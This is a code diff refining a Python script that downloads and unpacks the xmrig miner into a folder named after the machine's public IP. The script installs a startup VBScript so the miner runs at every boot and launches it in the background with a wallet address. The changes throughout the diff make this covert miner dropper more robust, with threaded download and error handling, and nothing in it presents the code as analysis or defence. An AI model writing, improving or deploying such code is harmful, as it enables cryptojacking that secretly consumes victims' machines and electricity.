@@ -5,6 +5,7 @@ import sys
 import ctypes
 import requests
 import shutil
+import threading
 
 def is_admin():
     """Check if the script is being run with administrative privileges."""
@@ -16,15 +17,16 @@ def is_admin():
 def download_file(url, destination):
     """Download a file from a URL to a specified destination."""
     try:
-        response = requests.get(url, stream=True)
-        response.raise_for_status()
-        with open(destination, "wb") as file:
-            for chunk in response.iter_content(chunk_size=1024):
-                if chunk:
-                    file.write(chunk)
-    except Exception as e:
+        with requests.get(url, stream=True) as response:
+            response.raise_for_status()
+            with open(destination, "wb") as file:
+                for chunk in response.iter_content(chunk_size=1024):
+                    if chunk:
+                        file.write(chunk)
+    except requests.exceptions.RequestException as e:
         print(f"Error downloading file: {e}")
-        sys.exit(1)
+        return False
+    return True
 
 def extract_zip(zip_file, extract_dir):
     """Extract the zip file to the specified directory."""
@@ -33,7 +35,8 @@ def extract_zip(zip_file, extract_dir):
             zip_ref.extractall(extract_dir)
     except zipfile.BadZipFile:
         print("Error extracting the zip file.")
-        sys.exit(1)
+        return False
+    return True
 
 def create_startup_vbs(xmrig_path, startup_path, bitcoin_address):
     """Create a VBScript to run xmrig on startup."""
@@ -44,7 +47,8 @@ def create_startup_vbs(xmrig_path, startup_path, bitcoin_address):
     ''')
     except IOError as e:
         print(f"Error creating startup VBScript: {e}")
-        sys.exit(1)
+        return False
+    return True
 
 def run_xmrig(xmrig_path, bitcoin_address):
     """Run xmrig in the background."""
@@ -57,7 +61,8 @@ def run_xmrig(xmrig_path, bitcoin_address):
         )
     except Exception as e:
         print(f"Error running xmrig: {e}")
-        sys.exit(1)
+        return False
+    return True
 
 def show_message_box(message, title):
     """Display a message box using ctypes (no third-party libraries)."""
@@ -68,11 +73,20 @@ def get_public_ip():
     try:
         response = requests.get("https://api.ipify.org?format=json")
         response.raise_for_status()
-        ip_address = response.json().get("ip")
-        return ip_address
+        return response.json().get("ip")
     except requests.exceptions.RequestException:
         print("Error retrieving public IP address.")
-        sys.exit(1)
+        return None
+
+def move_extracted_files(src_dir, dest_dir):
+    """Move extracted files to the destination directory."""
+    for item in os.listdir(src_dir):
+        source_item = os.path.join(src_dir, item)
+        destination_item = os.path.join(dest_dir, item)
+        if os.path.isdir(source_item):
+            shutil.move(source_item, destination_item)
+        else:
+            shutil.move(source_item, destination_item)
 
 def main():
     if not is_admin():
@@ -87,35 +101,34 @@ def main():
 
     # Retrieve the public IP address to use as the folder name
     public_ip = get_public_ip()
+    if not public_ip:
+        print("Unable to retrieve public IP, aborting.")
+        sys.exit(1)
 
     # Ensure the extraction directory exists
     EXTRACT_DIR = os.path.join(EXTRACT_BASE_DIR, public_ip)
     os.makedirs(EXTRACT_DIR, exist_ok=True)
 
-    # Download the zip file
-    download_file(URL, FILENAME)
+    # Download the zip file in a separate thread
+    download_thread = threading.Thread(target=download_file, args=(URL, FILENAME))
+    download_thread.start()
+    download_thread.join()  # Wait for download to complete
 
-    # Extract the zip file to a temporary directory
+    # Extract the zip file after downloading
     temp_extract_dir = os.path.join(EXTRACT_BASE_DIR, "temp_xmrig")
-    extract_zip(FILENAME, temp_extract_dir)
+    if not extract_zip(FILENAME, temp_extract_dir):
+        sys.exit(1)
 
     # Find the extracted xmrig directory and move its contents
     extracted_folders = [f for f in os.listdir(temp_extract_dir) if os.path.isdir(os.path.join(temp_extract_dir, f)) and "xmrig" in f.lower()]
     if extracted_folders:
         extracted_dir = os.path.join(temp_extract_dir, extracted_folders[0])
 
-        # Move all contents of the "xmrig" directory to the IP-named folder
-        for item in os.listdir(extracted_dir):
-            source_item = os.path.join(extracted_dir, item)
-            destination_item = os.path.join(EXTRACT_DIR, item)
-            if os.path.isdir(source_item):
-                shutil.move(source_item, destination_item)
-            else:
-                shutil.move(source_item, destination_item)
+        # Move extracted files to the IP-named folder
+        move_extracted_files(extracted_dir, EXTRACT_DIR)
 
-        # Clean up the "xmrig" folder and temporary extraction folder
-        shutil.rmtree(extracted_dir)
-        os.rmdir(temp_extract_dir)
+        # Clean up the temporary extraction folder
+        shutil.rmtree(temp_extract_dir)
 
         # Define the path to the xmrig executable
         xmrig_path = os.path.join(EXTRACT_DIR, "xmrig.exe")
@@ -124,11 +137,13 @@ def main():
         if os.path.exists(STARTUP_PATH):
             os.remove(STARTUP_PATH)
 
-        # Create startup VBScript
-        create_startup_vbs(xmrig_path, STARTUP_PATH, BITCOIN_ADDRESS)
+        # Create the startup VBScript
+        if not create_startup_vbs(xmrig_path, STARTUP_PATH, BITCOIN_ADDRESS):
+            sys.exit(1)
 
         # Run xmrig in the background
-        run_xmrig(xmrig_path, BITCOIN_ADDRESS)
+        if not run_xmrig(xmrig_path, BITCOIN_ADDRESS):
+            sys.exit(1)
 
         # Clean up the downloaded zip file after use
         os.remove(FILENAME)
